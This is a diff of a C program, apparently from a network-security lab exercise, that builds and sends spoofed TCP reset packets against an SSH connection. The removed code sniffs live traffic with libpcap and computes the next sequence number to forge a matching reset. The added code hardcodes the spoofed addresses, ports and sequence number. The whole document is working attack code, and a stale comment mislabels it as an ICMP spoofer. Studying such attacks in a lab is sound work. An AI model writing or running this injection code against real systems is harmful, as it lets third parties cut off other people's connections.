@@ -1,88 +1,25 @@
-#include <pcap.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
 
-#include <arpa/inet.h>
-#include <netinet/udp.h>
+/////
+
+#include <stdio.h>
+#include <string.h>
 #include <sys/socket.h>
+#include <netinet/ip.h>
 
 #include "myheader.h"
 
-#define  BUFSIZE 1500
+#define SRC_IP   "10.0.2.15"
+#define DEST_IP  "10.0.2.4"
+#define DEST_PORT "22"   
+#define SRC_PORT "43068"     //give this the port number
+#define SEQ_NUM  "4112079629"  //give this the next sequence number
 
-void process_ip(struct ipheader* ip);
+/******************************************************************
+  Spoof an ICMP echo request using an arbitrary source IP Address
+*******************************************************************/
+int main() {  
 
-void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
-{
-  struct ethheader *eth = (struct ethheader *)packet;
-  if (ntohs(eth->ether_type) == 0x0800) 
-      process_ip((struct ipheader*)(packet + SIZE_ETHERNET));
-};
- 
-int main()
-{
-  pcap_t *handle;
-  char errbuf[PCAP_ERRBUF_SIZE];
-  struct bpf_program fp;
- // char filter_exp[] = "telnet";
-  // Don't sniff the packet from/to the specified ether address
-  //char filter_exp[] = "not (ether host 08:00:27:c5:79:5f)";
- char filter_exp[] = "";
-  bpf_u_int32 net; 
-
-  //Open live pcap session on NIC with name eth0
-  handle = pcap_open_live("eth14", BUFSIZ, 1, 1000, errbuf);    
-
-  //Compile filter_exp into BPF psuedo-code
-  pcap_compile(handle, &fp, filter_exp, 0, net); 
-
-  pcap_setfilter(handle, &fp); //Setup BPF code on the socket
-  pcap_loop(handle, -1, got_packet, NULL); //Capture packets
-  pcap_close(handle);   //Close the handle 
-  return 0;
-}
-
-void process_ip(struct ipheader* ipGiven)
-{
-    int ip_header_len = ipGiven->iph_ihl * 4;
-
-    printf("-------------------------------------\n");
-    /* print source and destination IP addresses */
-    printf("       From: %s\n", inet_ntoa(ipGiven->iph_sourceip));
-    printf("         To: %s\n", inet_ntoa(ipGiven->iph_destip));
-
-
-
-    u_char *header = ((u_char *) ipGiven) + ip_header_len;
-
-
-
-//struct tcpheader *tcp = (struct tcpheader *) (ip + sizeof(struct ipheader));
-struct tcpheader *tcpGiven = (struct tcpheader *)header;
-int total = 0;
-
-
-
-
-    /* determine protocol */
-    switch(ipGiven->iph_protocol) {
-        case IPPROTO_TCP:
-            printf("   Protocol: TCP\n");
-            //total = (int)(ip->iph_len - sizeof(struct ipheader) - sizeof(struct tcpheader)) +   (tcp->tcp_seq);
-            printf("Sequence Number %lu\n", ntohl(tcpGiven->tcp_seq));
-            printf("Total Length is %hu\n", ipGiven->iph_len);
-            printf("Size of ipheader is %i\n", sizeof(struct ipheader));
-            printf("Size of tcpheader is %i\n", sizeof(struct tcpheader));
-            printf("Next sequence number %i", (uint32_t)(ipGiven->iph_len - sizeof(struct ipheader) -sizeof(struct tcpheader) + ntohl(tcpGiven->tcp_seq)));
-//need a source port
-//need a sequence number
-
-//check the negative numbersl
-
-            
-char buffer[PACKET_LEN];
+   char buffer[PACKET_LEN];
   
 
    /*********************************************************
@@ -93,12 +30,13 @@ struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));
 
    memset(buffer, 0, PACKET_LEN);
    //actually clears it
+
    /*********************************************************
       Step 2: Fill in the IP header.
     ********************************************************/
-tcp->tcp_sport = tcpGiven->tcp_sport; //rand()
-tcp->tcp_dport = htons(22); //atoi()
-tcp->tcp_seq = htonl((uint32_t)(ip->iph_len - sizeof(struct ipheader) -sizeof(struct tcpheader) + ntohl(tcpGiven->tcp_seq))); //rand()
+tcp->tcp_sport = htons(atoi(SRC_PORT)); //rand()
+tcp->tcp_dport = htons(atoi(DEST_PORT)); //atoi()
+tcp->tcp_seq = htonl(atoi(SEQ_NUM)); //rand()
 tcp->tcp_offx2 = 0x50;
 tcp->tcp_flags = 0x4;
 tcp->tcp_win = htons(20000);
@@ -108,11 +46,11 @@ ip->iph_ver = 4;
 ip->iph_ihl = 5;
 ip->iph_ttl = 20;
 
-ip->iph_sourceip.s_addr = ipGiven->iph_sourceip.s_addr;
+ip->iph_sourceip.s_addr = inet_addr(SRC_IP);
 //inet_addr(SRC_IP);
-ip->iph_destip.s_addr = ipGiven->iph_destip.s_addr;
+ip->iph_destip.s_addr = inet_addr(DEST_IP);
 ip->iph_protocol = IPPROTO_TCP;
-ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
+ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));   // + data_len
 
 
 struct pseudo_tcp fake;
@@ -140,29 +78,11 @@ tcp->tcp_sum = in_cksum((unsigned short*) &fake, sizeof(struct pseudo_tcp));
 
 
    send_raw_ip_packet (ip);
+ 
 
 
-
-
-                                            //(total length -  size of iph_protocol  -   size of tcp        ) + sequence nubmer
-         //   printf();
-            //substract from length size of struct ip head and size of struct tcp header, and add to sequence
-            return;
-        case IPPROTO_UDP:
-           // printf("   Protocol: UDP\n");
-            return;
-        case IPPROTO_ICMP:
-          //  printf("   Protocol: ICMP\n");
-            return;
-        case IPPROTO_IP:
-           /// printf("   Protocol: IP\n");
-            return;
-        default:
-            printf("   Protocol: unknown\n");
-            return;
-    }
-
-
+   return 0;
 }
 
 
+//WORKS
